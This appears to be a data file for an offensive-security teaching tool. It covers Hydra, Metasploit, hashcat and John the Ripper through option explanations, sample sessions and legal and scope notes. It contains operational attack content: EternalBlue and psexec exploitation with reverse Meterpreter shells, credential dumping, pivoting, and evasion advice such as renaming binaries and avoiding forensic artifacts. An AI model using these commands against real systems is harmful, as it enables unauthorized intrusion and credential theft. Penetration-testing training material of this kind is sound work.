legal_notes: US CFAA (18 U.S.C. § 1030): Running Hydra against any system you do not own or have explicit written authorization to test constitutes unauthorized access under the CFAA, regardless of whether you successfully authenticate. The act of sending credential attempts — even failed ones — to a system without authorization is itself the offense. 'I was just testing' is not a defense. Penalties include felony charges with up to 10 years imprisonment for first offenses involving intent to defraud.

RULES OF ENGAGEMENT — SCOPE AND LOCKOUT RISK: Your engagement authorization must explicitly cover credential attacks, not just 'network testing.' Many scopes exclude brute-force attacks due to account lockout risk. Before running Hydra against any AD-integrated service, confirm in writing: (a) credential attacks are in scope, (b) the client's AD lockout policy threshold, and (c) whether production accounts are in scope or only test accounts. Locking out a domain admin account or a service account mid-engagement can cause production outages — this is a client relationship and legal liability issue, not just a technical one.

CLOUD AND MODERN AUTH CONSIDERATION: Targeting cloud-federated authentication endpoints (Azure AD / Entra ID login, Okta, Ping Identity, Google Workspace SSO) with Hydra introduces additional legal exposure beyond the CFAA. Microsoft's Azure AD terms of service and Okta's platform agreements prohibit automated credential testing even against your own tenant unless conducted through approved penetration testing notification processes (Microsoft requires advance notification for testing Azure-hosted resources). Additionally, modern identity providers implement Smart Lockout and risk-based conditional access that may silently block attempts without returning error codes — meaning Hydra may report no valid credentials even when they exist, or may trigger account risk flags that alert the target's security team without locking the account.
false_positives: HTTP FORM FAILURE STRING MISCONFIGURATION: The http-post-form module determines success or failure by matching a string in the HTTP response body. If you specify the wrong failure string (or no string), Hydra will report EVERY attempt as a valid credential because it never sees the failure indicator. Always manually test the login form with a known-bad credential in Burp Suite first, identify the exact failure string in the response body, and use that string in the Hydra module syntax. A common mistake is using the page title or a generic error word that also appears on the success page.

RATE LIMITING RETURNING HTTP 200 WITH ERROR BODY: Some web applications and WAFs return HTTP 200 OK for rate-limited or blocked requests but include an error message in the body (e.g., 'Too many requests, please try again later'). Hydra's http-post-form module evaluates the HTTP status code AND the failure string — if your failure string doesn't match the rate-limit message, Hydra will mark rate-limited responses as successful logins. You'll get a flood of false positives that are actually just the WAF blocking you.

SSH BANNER / KEYBOARD-INTERACTIVE AUTH: Some SSH servers are configured to use keyboard-interactive authentication instead of password authentication, or present a legal banner that requires acknowledgment before the password prompt. Hydra's SSH module may fail to handle these correctly and report all attempts as failed even when the password is correct. Verify the SSH auth method with `ssh -v target` before assuming Hydra's negative result is accurate.

NETWORK FILTERING THAT RETURNS TCP RST OR TIMEOUT: If a stateful firewall or IPS is silently dropping or resetting Hydra's connections after detecting the attack pattern, Hydra will report connection errors or timeouts and may interpret these as service unavailability rather than blocking. The service may be perfectly accessible via normal SSH client while Hydra reports it as unreachable — the IPS is selectively blocking Hydra's connection pattern (high-frequency SYN from same source) while allowing single connections through.

VALID CREDENTIALS THAT FAIL DUE TO MFA: Hydra has no MFA/2FA awareness. If the target service requires TOTP, push notification, or hardware token as a second factor, Hydra will successfully submit the correct username and password but the authentication will still fail at the MFA step. Hydra will report these as failed attempts. You may have valid credentials that Hydra marks as invalid. This is increasingly common against VPN portals, OWA with MFA enforced, and any Azure AD-protected resource with Conditional Access requiring MFA.
hydra.teach_alt: Network login brute forcer supporting 50+ protocols

metasploit.description: The world's most widely used penetration testing framework. Contains 2000+ exploits, 500+ auxiliary modules, 300+ payloads, and 200+ post-exploitation modules. Used by every professional red team and penetration tester on the planet. Integrates with Nmap, Nessus, Nexpose, and Burp Suite. Free, open-source, and more capable than commercial tools costing tens of thousands of dollars.
metasploit.teach_intro: Metasploit has four module types you must understand: EXPLOITS take advantage of a vulnerability to execute code on the target. PAYLOADS are what runs after the exploit succeeds — your backdoor, your shell, your Meterpreter agent. AUXILIARIES are everything else: scanners, fuzzers, brute forcers, sniffers. POST modules run after you have a session to escalate privileges, dump credentials, pivot, and persist. The workflow is always: search → use → show options → set → run. LHOST is always YOUR IP. RHOSTS is always the TARGET.

-q.label: Quiet — no banner
-q.desc: Start without the ASCII art banner. Clean output for professional work.
-q.teach: Always use -q in real engagements. The banner wastes time and makes screenshots look amateur. First command after launching: db_status to verify the PostgreSQL database is connected. Without DB, MSF loses host/service tracking.

-x.label: Execute on startup
-x.desc: Run MSF console commands automatically at launch. Chain with semicolons.
-x.example: msfconsole -q -x 'use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS 192.168.1.0/24; set THREADS 10; run'
-x.teach: -x is how you automate MSF. Write your full attack chain as a -x string or put it in a .rc file with -r. Perfect for running the same scanner across multiple engagements without manual setup.

-r.label: Resource script
-r.desc: Execute a .rc file of MSF commands line by line on startup.
-r.teach: Resource scripts (.rc files) are your automation superpower. Create recon.rc with: db_import nmap.xml; use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS file:/tmp/hosts.txt; run. Saves hours on large engagements.

search.label: Search modules
search.desc: Find exploits and modules by keyword, CVE, platform, type, or rank.
search.teach:
Search filters: type: (exploit/auxiliary/post/payload), platform: (windows/linux/osx/android), rank: (excellent/great/good/normal), cve: (CVE number), name: (module name). 'search rank:excellent type:exploit platform:windows' gives you the most reliable Windows exploits. Rank matters: excellent means reliable, normal means it might crash the service.

search ms17-010 — find modules by CVE, name, or platform

use.label: Load a module
use.desc: Select a module by full path or result number from search.
use.teach:
After search, you can type 'use 0' to use the first result. Always follow with 'info' to read the module description and 'show options' to see required settings. Required options (marked Required: yes) MUST be set before running.

use exploit/windows/smb/ms17_010_eternalblue

info.label: Module information
info.desc: Show full details about the loaded module including description, options, targets, and references.
info.teach:
Info shows you everything: what vulnerability the module exploits, which OS versions are vulnerable, the CVE number, references to exploit-db and research papers, and reliability notes. Read this before every exploitation attempt.

info — show module description, options, and targets

show options.label: Show required settings
show options.desc: Display all configurable options for the current module — required and optional.
show options.teach:
The output shows: Name, Current Setting, Required (yes/no), Description. Everything marked Required: yes with no value MUST be set. Common required options: RHOSTS (target), LHOST (your IP for reverse shells), PAYLOAD. Run 'show options' after every 'set' command to confirm values saved.

show required and optional parameters

show payloads.label: List compatible payloads
show payloads.desc: Show all payloads compatible with the current exploit module.
show payloads.teach: Payload naming is systematic: OS/arch/type/connection_method. windows/x64/meterpreter/reverse_tcp = Windows 64-bit, Meterpreter session, calls back to you over TCP. 'staged' (/) downloads shellcode in two stages — smaller initial payload. 'stageless' (_) is self-contained — works when outbound is filtered. Meterpreter > cmd shell always — more features, encrypted, fileless.

set.label: Configure option
set.desc: Set module options: RHOSTS (target), LHOST (your IP), LPORT (listen port), PAYLOAD, THREADS.
set.example:
set RHOSTS 192.168.1.0/24
set LHOST 10.10.10.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set THREADS 10
set.teach: Critical settings: RHOSTS accepts single IPs, ranges (192.168.1.1-50), CIDR (192.168.1.0/24), or files (file:/tmp/hosts.txt). LHOST must be YOUR IP reachable from the target — not 127.0.0.1. If pivoting through a compromised machine, LHOST is that machine's IP. 'setg' sets a value globally for all modules in the session.

run.label: Execute the module
run.desc: Launch the configured module. 'exploit' is identical. -j runs as background job.
run.teach: 'run' and 'exploit' are the same command. Add -j to run as a background job so you can keep using the console. After a successful exploit you see 'Meterpreter session X opened' — type 'sessions -i X' to interact. If it fails: check RHOSTS, verify the target is actually vulnerable (run the scanner first), check firewall rules.

check.label: Check if target is vulnerable
check.desc: Test if the target is vulnerable without actually exploiting it. Not all modules support this.
check.teach: Check sends probe packets to determine vulnerability without exploiting. Useful for client-facing reports — 'we verified vulnerability without exploitation'. Not all modules implement check — many require you to use a dedicated scanner auxiliary instead.

db_import.label: Import Nmap scan
db_import.desc: Import Nmap XML output into MSF's PostgreSQL database.
db_import.teach: This is the critical workflow: run nmap -sV -oX scan.xml first, then db_import it into MSF. After import: 'hosts' shows all discovered systems, 'services' shows all open ports/services, 'vulns' shows scanner-confirmed vulnerabilities. MSF then lets you run exploits directly against database entries with 'set RHOSTS' plus the host reference.

vulns.label: Show vulnerabilities
vulns.desc: List all vulnerabilities discovered and logged in the MSF database.
vulns.teach: Vulnerabilities get added to the DB when you run scanner auxiliaries (smb_ms17_010, mysql_login, etc.). Each vuln entry shows: host, name, references, proof. This becomes your exploitation checklist. Cross-reference with 'search cve:XXXX-XXXX' to find the exploit module.

sessions.label: Manage sessions
sessions.desc: List, interact with, and kill active Meterpreter/shell sessions.
sessions.teach:
sessions -l lists all open connections with ID, type, tunnel, and connection time. sessions -i 1 drops into that session. sessions -u 1 tries to UPGRADE a basic shell to Meterpreter — huge quality-of-life improvement. sessions -K kills all sessions. You can have 50+ sessions open simultaneously — route pivoting through them.

List active Meterpreter sessions

background.label: Background active session
background.desc: Return to msfconsole while keeping the current session alive.
background.teach:
Ctrl+Z or type 'background' to return to msfconsole with the session still running. The session stays active indefinitely. Use this to run post-exploitation modules: 'use post/windows/gather/hashdump; set SESSION 1; run'. Post modules extract hashes, keyloggers, screenshots, and more from backgrounded sessions.

Background current session (Ctrl+Z)

hashdump.label: Meterpreter: dump password hashes
hashdump.desc: From Meterpreter session: dump Windows SAM password hashes.
hashdump.teach:
hashdump extracts all local Windows password hashes from the SAM database. Requires SYSTEM privileges — run getsystem first if you only have admin. Output: username:RID:LM_hash:NT_hash. Take the NT hash (last field) to hashcat: -m 1000 for NTLM. Or pass-the-hash with crackmapexec.

Dump password hashes from SAM

getsystem.label: Meterpreter: escalate to SYSTEM
getsystem.desc: Attempt to elevate from Administrator to SYSTEM using 3 different techniques.
getsystem.teach:
getsystem tries: named pipe impersonation, token duplication, and service exploitation. SYSTEM is more powerful than Administrator — it can access LSASS for credential dumping. If getsystem fails, try: use post/multi/recon/local_exploit_suggester to find local privilege escalation exploits.

Attempt privilege escalation to SYSTEM

getuid.label: Meterpreter: current user
getuid.desc: Show which user account the Meterpreter session is running as.
getuid.teach: Always check getuid after gaining a session. NT AUTHORITY\SYSTEM = full control. DOMAIN\Administrator = domain admin. DOMAIN\low_priv_user = need to escalate. Your privilege level determines what post-exploitation is possible.

sysinfo.label: Meterpreter: system information
sysinfo.desc: Show OS version, hostname, architecture, and domain of the compromised system.
sysinfo.teach: Sysinfo gives you: computer name (useful for AD enumeration), OS + build number (for unpatched exploit search), architecture (x86 vs x64 matters for payload compatibility), domain name (confirms you're in a domain environment). Note the OS build — searchsploit 'windows build_number' finds local exploits.

migrate.label: Meterpreter: process migration
migrate.desc: Move Meterpreter into another running process for stability and stealth.
migrate.teach: Migrating into explorer.exe or svchost.exe makes Meterpreter much harder to detect and survive process crashes. If you're in a cmd.exe or powershell.exe that the user might close, migrate first. migrate -N explorer.exe finds and migrates by process name. Some post modules require migration to a specific process (e.g., keylogging needs explorer.exe).

load kiwi.label: Meterpreter: load Kiwi (Mimikatz)
load kiwi.desc: Load the Kiwi extension which wraps Mimikatz for credential extraction.
load kiwi.teach: Kiwi is Mimikatz built into Meterpreter. After 'load kiwi': creds_all dumps everything at once (plaintext passwords, NTLM hashes, Kerberos tickets), lsa_dump_sam gets SAM hashes, lsa_dump_secrets gets LSA secrets including service account passwords. Requires SYSTEM or debug privilege. Often catches plaintext passwords for recently logged-in domain users.

portfwd.label: Meterpreter: port forwarding
portfwd.desc: Forward local port through the Meterpreter session to access internal services.
portfwd.teach: Port forwarding turns the compromised machine into a proxy. portfwd add -l 13389 -p 3389 -r INTERNAL_IP lets you RDP to an internal machine through your session: rdesktop 127.0.0.1:13389. This is how you access services on network segments you can't reach directly. The -l is your local port, -p is the target port, -r is the target IP.

route.label: Session routing / pivoting
route.desc: Route MSF traffic through a Meterpreter session to reach internal networks.
route.teach: route add NETWORK/MASK SESSION_ID tells MSF to send all traffic for that network through your Meterpreter session. After routing, you can run ANY MSF module against the internal network through the pivot. This is how you compromise the entire internal network after one initial foothold.

set LHOST.label: set LHOST
set LHOST.teach: Your IP for reverse shell: set LHOST 192.168.1.50

output_read.meaning: successful exploit — you have a shell
exploit failed — check RHOSTS, LHOST, and payload

output_read.pattern: PAYLOAD => shows what shell will be sent — reverse_tcp
output_read.meaning: target calls back to you
Migration moves your shell into a stable process (migrate to explorer.exe)
Always set LHOST to your actual reachable IP, not localhost

opsec_notes: BEGINNER NOISE: Every time msfconsole starts and you run 'db_nmap' or any auxiliary scanner, it generates standard TCP SYN packets visible to any IDS with default Snort/Suricata rules. The default nmap integration inside MSF uses the same signatures as standalone nmap — a defender watching NetFlow will see a single source IP hitting dozens of ports in milliseconds. This is the loudest thing you can do on a network.

ARTIFACT — PROCESS TREE: On Windows targets, Metasploit's default Meterpreter stager (windows/meterpreter/reverse_tcp) spawns as a child of whatever process delivered it (e.g., WINWORD.EXE → cmd.exe → rundll32.exe). CrowdStrike Falcon and SentinelOne both score parent-child anomalies heavily — a Word document spawning a network-connected child process is a near-certain alert. Defender for Endpoint logs this under DeviceProcessEvents with InitiatingProcessFileName showing the parent.

CUTTING-EDGE 2025: Metasploit's default AMSI bypass (used in PowerShell-based stagers) patches AmsiScanBuffer in-memory. Since Windows 11 22H2, Microsoft's Kernel Data Protection (KDP) and Hypervisor-Protected Code Integrity (HVCI) can detect userland AMSI patching via ETW-TI (Event Tracing for Windows — Threat Intelligence provider). Defender for Endpoint surfaces this as Alert ID 'Suspicious AMSI bypass attempt'. Modern evasion requires either a custom reflective loader that never touches AmsiScanBuffer, or a kernel-level bypass — neither ships in stock MSF.

CUTTING-EDGE 2025: Metasploit's Meterpreter generates a well-known TLS certificate fingerprint (JA3/JA3S hash) that has been in threat intel feeds since 2018. Modern NDR platforms (Darktrace, ExtraHop, Vectra) fingerprint the Meterpreter TLS handshake regardless of port. In 2025 engagements, operators stage through a redirector (Apache mod_rewrite or Nginx) with a valid Let's Encrypt cert and use a custom C2 profile (Sliver or Havoc) rather than stock Meterpreter for anything requiring stealth.

ARTIFACT — DISK WRITES: The default 'upload' and 'download' Meterpreter commands write files to disk at predictable temp paths (e.g., C:\Users\<user>\AppData\Local\Temp\). Sysmon EID 11 (FileCreate) and EID 23 (FileDelete) will capture these. If the payload itself touches disk (non-reflective), Windows Defender's real-time protection will scan it on write — even if AMSI is bypassed in memory.

SCOPE ARTIFACT: Metasploit's postgresql database (msfdb) stores all hosts, services, credentials, and loot locally. If your assessment laptop is seized or imaged, the entire engagement history — including credentials and session logs — is recoverable from ~/.msf4/db/ unless the database is encrypted and wiped post-engagement. Use full-disk encryption and a dedicated assessment VM that is destroyed after each engagement.

sample_outputs.scenario: Beginner: Student has found port 445 open on a Windows 10 lab VM (10.10.10.50) via nmap. They want to check if it is vulnerable to EternalBlue (MS17-010) before attempting exploitation.
sample_outputs.command:
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 10.10.10.50
msf6 auxiliary(scanner/smb/smb_ms17_010) > set THREADS 1
msf6 auxiliary(scanner/smb/smb_ms17_010) > run
sample_outputs.output:
[*] 10.10.10.50:445        - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.10.50:445        - Host is likely VULNERABLE to MS17-010! - Windows 10 Pro 10240 x64 (64-bit)
[*] 10.10.10.50:445        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
sample_outputs.explanation: The [+] prefix means the scanner got a positive match — the target responded to the MS17-010 probe in a way that indicates the SMBv1 vulnerability is present and unpatched. The version string 'Windows 10 Pro 10240 x64' comes from the SMB NEGOTIATE response, which leaks the OS build number. Build 10240 is the original RTM release of Windows 10 (July 2015) — no patches applied. Next logical steps: (1) use exploit/windows/smb/ms17_010_eternalblue to attempt code execution, (2) set PAYLOAD to windows/x64/meterpreter/reverse_tcp, (3) set LHOST to your tun0 IP (VPN interface) — never your eth0 if you are on a shared network. Beginners: the AUXILIARY module only CHECKS — it does not exploit. You must switch to the EXPLOIT module to get a shell.

sample_outputs.scenario: Advanced: Operator has a valid local admin credential (CORP\svc_backup : P@ssw0rd123!) harvested from a previous Responder capture on the 10.10.20.0/24 subnet. They want to use CrackMapExec-style lateral movement through MSF's psexec module to open a Meterpreter session on the domain controller at 10.10.20.5, then immediately background it and run a post-exploitation credential dump.
sample_outputs.command:
msf6 > use exploit/windows/smb/psexec
msf6 exploit(windows/smb/psexec) > set RHOSTS 10.10.20.5
msf6 exploit(windows/smb/psexec) > set SMBUser svc_backup
msf6 exploit(windows/smb/psexec) > set SMBPass P@ssw0rd123!
msf6 exploit(windows/smb/psexec) > set SMBDomain CORP
msf6 exploit(windows/smb/psexec) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/psexec) > set LHOST 10.10.20.100
msf6 exploit(windows/smb/psexec) > set LPORT 4444
msf6 exploit(windows/smb/psexec) > run
sample_outputs.output:
[*] Started reverse TCP handler on 10.10.20.100:4444
[*] 10.10.20.5:445 - Connecting to the server...
[*] 10.10.20.5:445 - Authenticating to 10.10.20.5:445|CORP as user 'svc_backup'...
[*] 10.10.20.5:445 - Selecting PowerShell target
[*] 10.10.20.5:445 - Executing the payload...
[+] 10.10.20.5:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (201798 bytes) to 10.10.20.5
[*] Meterpreter session 1 opened (10.10.20.100:4444 -> 10.10.20.5:52341) at 2025-11-03 02:14:37 +0000

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(windows/smb/psexec) > use post/windows/gather/credentials/credential_collector

[+] Credential data saved to: /root/.msf4/loot/20251103021512_default_10.10.20.5_windows.creds_041337.txt

sample_outputs.explanation: The psexec module authenticates over SMB (port 445), writes a randomly-named service binary to ADMIN$ (C:\Windows\), starts it as SYSTEM, executes the payload, then attempts to delete the service — hence the 'Service start timed out' message, which is normal. The session opens as NT AUTHORITY\SYSTEM, the highest privilege on a Windows host. Critical opsec failures here: (1) psexec writes a binary to disk — Defender will likely detonate it; prefer use exploit/windows/smb/psexec_psh which uses a PowerShell stager, or switch to Impacket's wmiexec.py for fileless lateral movement. (2) Windows Security EID 4624 (logon type 3) and EID 7045 (new service installed) fire on the DC — a SOC watching for service installs on DCs will alert within minutes. (3) After credential_collector, pivot to post/multi/recon/local_exploit_suggester to find local privesc paths, then use secretsdump via Impacket or post/windows/gather/hashdump for the full NTDS.dit if this is the DC. BloodHound ingestion (SharpHound) should run next to map AD attack paths.

legal_notes: US CFAA (18 U.S.C. § 1030): Metasploit's exploitation modules — psexec, EternalBlue, web delivery — constitute 'intentional unauthorized access' under the CFAA if used against systems you do not own or have explicit written authorization to test. 'Explicit written' means a signed Rules of Engagement document specifying IP ranges, test windows, and permitted techniques. Verbal permission is not a legal defense. A misconfigured RHOSTS that hits one IP outside scope is a federal crime regardless of intent.

SCOPE AND ROE: Metasploit's db_nmap and auxiliary scanners make it trivially easy to scan entire subnets. Before running any scan or exploit, verify your RHOSTS value against the authorized IP list in your SOW. Many engagements explicitly prohibit DoS-risk modules (e.g., ms17_010_eternalblue can blue-screen unpatched Windows 7/2008 hosts) — check your ROE for 'no DoS' clauses before running any exploit module, not just auxiliary scanners.

CLOUD AND MODERN AD: If the target environment includes cloud-joined or Entra ID (Azure AD) hybrid-joined machines, Metasploit sessions on those hosts may trigger Azure Identity Protection risk events (sign-in risk, user risk) that are visible to the client's security team in real time — even if the SOC is not actively monitoring. This can blow an engagement before you reach your objectives. Confirm with the client whether Azure Identity Protection alerts should be suppressed during the test window, and document this in the ROE.
false_positives: smb_ms17_010 scanner reports 'Host is likely VULNERABLE' on fully patched Windows Server 2019 hosts that have SMBv1 disabled but SMBv2/3 enabled — the scanner's probe logic can misinterpret certain SMBv2 error codes as a positive match. Always confirm with the check command in the exploit module itself before attempting exploitation.

The 'check' command in many exploit modules returns 'The target appears to be vulnerable' based solely on version banner matching — it does not confirm the specific patch level. A host running Apache/2.4.51 may have backported patches applied by the OS vendor (common on RHEL/CentOS) that fix the vulnerability without changing the version string. Banner-based checks produce false positives on vendor-patched Linux distributions at a high rate.

db_nmap imports can cause MSF's 'vulns' command to show vulnerabilities that were never confirmed — they are inferred from Nmap's version detection and NSE script output, which itself uses banner grabbing. A service running on a non-standard port that returns a banner matching an old version string will populate the vuln database even if the service is a honeypot or the banner is spoofed.

Meterpreter's 'getsystem' command attempts three privilege escalation techniques in sequence. It will report 'Got a SYSTEM shell' even if the resulting process has SYSTEM token but is sandboxed (e.g., running inside a low-integrity container or a restricted job object). Always verify with getuid AND ps to confirm the process context — a SYSTEM token inside a Docker container does not give you host-level access.

The sessions command may show a session as 'active' after the target process has been killed or the connection has been reset by a firewall. Attempting to interact with a dead session (sessions -i <id>) will hang for the TCP timeout period before erroring. Use sessions -K to kill all dead sessions and re-exploit rather than assuming the session is live.

mitre_attack.name: OS Credential Dumping: Security Account Manager

metasploit.teach_alt: Exploitation framework — 2000+ modules covering exploit, post, auxiliary

hashcat.description: The world's fastest password recovery tool. GPU-accelerated cracking of MD5, SHA1, SHA256, bcrypt, NTLM, WPA2, and 300+ hash types. Can process billions of candidates per second on modern GPUs.
hashcat.teach_intro: Hashcat doesn't try to 'decrypt' hashes — it generates candidates and hashes them, comparing to your target. On a modern GPU it can try billions of passwords per second. The key is attack mode: dictionary (-a 0), combinator (-a 1), bruteforce (-a 3), rule-based (-a 0 with -r).

-m.label: Hash Type
-m.teach:
Always identify the hash type first. Use hash-identifier or hashid. Wrong -m = zero results. NTLM (1000) is Windows, MD5 (0) is common web apps.

Hash type: 1000=NTLM, 0=MD5, 1800=SHA512crypt, 13100=Kerberoast, 22000=WPA2

-a.label: Attack Mode
-a.teach:
Mode 0 (dictionary) with rockyou.txt cracks 60-80% of real-world hashes. Mode 3 (brute force) with masks covers the rest.

Attack mode: 0=dictionary, 3=brute force, 6=hybrid wordlist+mask

-r.label: Rule File
-r.desc: Apply transformation rules to wordlist: -r rules/best64.rule
-r.teach:
Rules transform words: password → P@ssw0rd!, admin → Admin123. best64.rule applies 64 transformations to every word — multiplies your coverage massively.

Rules file: -r /usr/share/hashcat/rules/best64.rule

--show.label: Show Cracked
--show.desc: Display previously cracked hashes from the potfile.
--show.teach:
Hashcat saves cracked passwords in ~/.hashcat/hashcat.potfile. --show retrieves them without cracking again.

Show cracked hashes from previous session

--wordlist.label: Wordlist
--wordlist.desc: Path to wordlist. rockyou.txt is default, seclists has many specialized lists.
--wordlist.teach: rockyou.txt (14M passwords) covers most. For targeted attacks, generate custom wordlists with CeWL from the target's website.

-O.label: Optimized Kernels
-O.desc: Enable optimized kernels — faster but limited to max 32 char passwords.
-O.teach: -O nearly doubles cracking speed. Most real passwords are under 32 chars so this is usually safe to use.

--increment.label: Brute Force Increment
--increment.desc: Start brute force from min length and increment up. Use with -a 3.
--increment.teach: ?a = all chars. Start with 4 chars and work up to 8. Catches short passwords first before long ones.

--status.label: Status Update
--status.desc: Show real-time status of cracking session.
--status.teach: Press 's' during cracking to get status. Shows speed, progress percentage, estimated time remaining.

output_read.meaning: cracked — check hashcat --show for the plaintext
wordlist finished with no crack — try rules or different wordlist
how fast — GPU >>> CPU for this
working, ETA shows estimated finish
Use -a 0 -r rules/best64.rule before brute force — catches 80% faster

hashcat.teach_alt: GPU-accelerated password hash cracker — fastest on the planet

john.description: Classic CPU-based password cracker. Auto-detects hash types, cracks /etc/shadow files, ZIP/RAR passwords, SSH key passphrases, Office documents. Where hashcat uses GPU power, John uses smart wordlist mangling and CPU efficiency.
john.teach_intro: John auto-detects hash formats and applies built-in mangling rules. It's slower than hashcat on simple hashes but excels at cracking files (ZIP, PDF, SSH keys) via its companion tools: zip2john, ssh2john, pdf2john. The workflow is: convert the file to a John-format hash, then crack it.

--wordlist.label: Wordlist Mode
--wordlist.teach: Most cracks happen here. rockyou.txt covers real-world passwords. John applies mangling rules on top automatically.

--format.label: Force Hash Format
--format.desc: Specify hash type when auto-detect fails: --format=NT, --format=sha512crypt, --format=bcrypt.
--format.teach: Auto-detect usually works. Force it when you know the hash type. Use 'john --list=formats' to see all supported types.

--rules.label: Mangling Rules
--rules.desc: Apply transformation rules to the wordlist.
--rules.teach: Rules transform: password → P@ssword1!, admin → @dm1n. John's built-in rules are aggressive and catch common substitutions.

--incremental.label: Brute Force Mode
--incremental.desc: Full character brute force. Slow but thorough.
--incremental.teach: Incremental tries all character combinations. Use as last resort — can take days for long passwords.

--show.label: Show Cracked
--show.desc: Display all cracked passwords from the session.
--show.teach: John saves cracked passwords in ~/.john/john.pot. --show reads them back without re-cracking.

--pot.label: Potfile Location
--pot.teach: Useful when sharing cracking sessions or keeping separate potfiles per engagement.

--fork.label: Multi-Process
--fork.desc: Run N parallel John processes on multi-core CPU.
--fork.teach: Use all CPU cores: --fork=4 for quad-core. Not as fast as GPU but great for file cracking where GPU can't help.

opsec_notes: Beginner noise: John the Ripper runs entirely on the local machine — it generates NO network traffic. The risk is not network-based detection but disk and process-based: john writes cracked passwords to a potfile (~/.john/john.pot by default) in plaintext. Any EDR or DLP solution scanning the filesystem will find this file. Move or specify a custom --pot path to a location outside standard user directories.

John spawns worker processes (especially with --fork) that appear in the process tree as multiple 'john' child processes under a single parent. On a compromised Windows host running john via WSL or a dropped binary, CrowdStrike Falcon's process tree anomaly detection will flag a non-standard parent (e.g., cmd.exe or a web shell process) spawning a CPU-intensive child with high entropy command-line arguments. Rename the binary and strip its PE header strings before dropping it on a target.

Concrete defender artifact: On Linux, john's execution is visible in /var/log/auth.log (if run as root), /proc/<pid>/cmdline (readable by any process), and auditd if configured with execve syscall rules (audit.log EID type=EXECVE). The full command line including --wordlist path and hash file path is logged. Defenders with auditd or Sysmon for Linux (EID 1 equivalent) will see the exact wordlist and target hash file paths.

On Windows endpoints with Microsoft Defender for Endpoint (MDE) enabled, john.exe or any renamed variant will be scored by the Antimalware Scan Interface (AMSI) on load and by Defender's heuristic engine based on behavioral telemetry — specifically high sustained CPU usage from a non-whitelisted process combined with file reads of files containing hash-like strings. MDE's 'suspicious process activity' alert fires on this pattern in 2025 tenant configurations with default attack surface reduction (ASR) rules enabled.

Advanced evasion: When cracking on an operator-controlled system (not the target), the opsec risk shifts to time-to-crack visibility. Long john sessions on cloud VMs (AWS EC2, Azure VM) generate sustained high-CPU billing anomalies detectable by cloud cost monitoring and, in some enterprise environments, by cloud security posture tools (Defender for Cloud, AWS GuardDuty anomaly baselines). Prefer spot/preemptible instances and terminate immediately after cracking to minimize the billing and telemetry window.

The companion tools (zip2john, ssh2john, pdf2john, office2john) write intermediate hash files to disk. These hash files are themselves forensic artifacts — a defender doing incident response who finds a file named 'target.hash' containing an NTLM or bcrypt hash string will immediately understand the attacker's intent and the source credential. Use memory-only pipelines where possible: zip2john archive.zip | john --stdin --format=pkzip to avoid writing the intermediate hash to disk.

sample_outputs.scenario: Beginner: CTF challenge, cracking a single bcrypt hash from /etc/shadow using rockyou.txt wordlist. Operator has the shadow file from a captured Linux VM.
sample_outputs.output:
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
summer2023       (bob)
1g 0:00:04:17 DONE (2025-05-14 11:32) 0.003882g/s 112.4p/s 112.4c/s 112.4C/s
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
sample_outputs.explanation: John loaded one bcrypt hash from shadow.txt and identified the cost factor (1024 iterations — this is why bcrypt took 4+ minutes vs seconds for MD5). The cracked password is 'summer2023' for user 'bob'. The line '1g 0:00:04:17 DONE' means 1 guess succeeded after 4 minutes 17 seconds at ~112 passwords/second — bcrypt's intentional slowness. Next steps: (1) Try 'john --show shadow.txt' to display all cracked hashes from the potfile. (2) Test the credential against SSH with 'ssh bob@<target>' or against other services via crackmapexec. (3) Check if bob reused this password elsewhere — run the same wordlist against any other captured hashes from the environment.

sample_outputs.scenario: Advanced: Post-exploitation on a Windows domain — operator has extracted a KeePass .kdbx database from a compromised workstation and needs the master password to access stored domain credentials.
sample_outputs.output:
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 60000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES, 1=TwoFish, 2=ChaCha20]) is 0 for all loaded hashes
Will run 8 OpenMP threads (forked)
Press 'q' or Ctrl-C to abort, almost any other key for status
W1nter2024!      (corp_passwords)
1g 0:00:18:43 DONE (2025-05-14 13:07) 0.000890g/s 87.34p/s 87.34c/s 87.34C/s
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
sample_outputs.explanation: keepass2john extracted the KeePass2 master password hash (SHA256, 60000 PBKDF2 iterations, AES). The KoreLogic ruleset applies aggressive mangling — leetspeak, seasonal patterns, corporate password conventions — which is why 'W1nter2024!' was found despite not appearing verbatim in the wordlist. The --fork=8 split work across 8 CPU processes; --pot redirected the potfile away from the default ~/.john/john.pot to reduce forensic footprint. Next steps: (1) Open the .kdbx with the cracked master password using 'keepassxc-cli export corp_passwords.kdbx' or KeePassXC GUI to dump all stored credentials. (2) Feed extracted domain credentials into BloodHound/SharpHound to map AD attack paths. (3) Test high-value credentials against the domain controller with 'crackmapexec smb <DC_IP> -u <user> -p <pass> --shares' and check for DCSync rights via 'secretsdump.py'. (4) If the KeePass DB contains SSH keys or API tokens, pivot to cloud infrastructure immediately.

legal_notes: CFAA boundary: Possessing a hash file extracted from a system you are not authorized to access is itself a CFAA violation (18 U.S.C. § 1030), regardless of whether you successfully crack it. The act of extraction — not the cracking — is the primary legal exposure. Ensure your rules of engagement explicitly authorize credential capture and offline cracking, not just 'access to the system'.

Authorization scope: Hash files frequently contain credentials for systems OUTSIDE your engagement scope. A shadow file from a Linux web server may contain hashes for accounts that also exist on out-of-scope domain controllers or cloud consoles. Cracking and using those credentials against out-of-scope systems is a scope violation even if the hash extraction was authorized. Confirm with the client which credential classes are in-scope for cracking and use before proceeding.

